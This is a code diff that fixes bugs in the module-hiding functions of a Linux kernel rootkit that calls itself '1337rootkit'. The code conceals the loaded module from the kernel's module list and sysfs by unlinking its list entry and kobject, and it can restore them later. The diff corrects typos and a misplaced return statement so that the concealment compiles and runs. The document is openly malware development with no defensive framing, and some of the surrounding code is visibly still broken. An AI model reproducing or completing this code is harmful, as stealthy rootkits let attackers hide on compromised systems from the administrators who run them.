@@ -111,14 +111,14 @@ static void rootkit_hide(void) {
 
 	/*store the previous kernel object of the list
 	  then hide the rootkit kernel object*/
-	module_kobj_previous = THIS_MODULE->mkobj.kobj,entry.prev;
+	prev_kobj = THIS_MODULE->mkobj.kobj.entry.prev;
 	kobject_del(&THIS_MODULE->mkobj.kobj);
 	list_del(&THIS_MODULE->mkobj.kobj.entry); 
 
 
 	printk(KERN_INFO "1337rootkit hidden\n");
 	rootkit_hidden = 1;
-	return 0;
+	
 }
 
 static void rootkit_show(void) {
@@ -127,8 +127,7 @@ static void rootkit_show(void) {
 	rootkit_hidden = 0;
 
 	list_add(&THIS_MODULE->list, prev_mod);
-	kboject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, THIS_MODULE->name);
-	list_add
+	kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, THIS_MODULE->name);
 	
 }
 
